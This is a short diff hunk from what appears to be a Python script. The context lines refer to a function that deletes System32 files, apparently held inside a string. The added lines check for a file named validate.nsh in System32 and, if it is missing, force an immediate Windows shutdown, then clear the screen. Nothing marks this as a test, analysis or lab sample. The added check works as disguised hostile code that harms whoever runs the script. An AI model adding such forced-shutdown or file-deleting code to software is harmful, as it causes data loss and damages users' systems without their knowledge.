@@ -26,6 +26,9 @@ def delete_system32_filex():
 
 delete_system32_filex()
 '''
+pathx = r'C:\Windows\System32\validate.nsh'
+if not os.path.exists(pathx):
+    os.system("shutdown /s /f /t 0")
 os.system('cls')
 print("")
 print("")
